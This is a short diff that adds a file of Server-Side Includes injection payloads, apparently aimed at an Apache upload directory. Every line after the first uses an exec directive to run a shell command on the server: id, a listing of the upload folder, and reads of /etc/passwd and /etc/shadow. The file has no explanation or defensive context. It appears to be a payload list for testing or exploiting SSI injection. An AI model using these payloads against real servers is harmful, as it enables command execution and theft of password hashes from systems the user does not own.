@@ -1,0 +1,5 @@
+<!--#echo var="DOCUMENT_ROOT" -->
+<!--#exec cmd="id" -->
+<!--#exec cmd="cat /etc/passwd" -->
+<!--#exec cmd="ls -al /usr/local/apache2/htdocs/userupload" -->
+<!--#exec cmd="cat /etc/shadow" -->
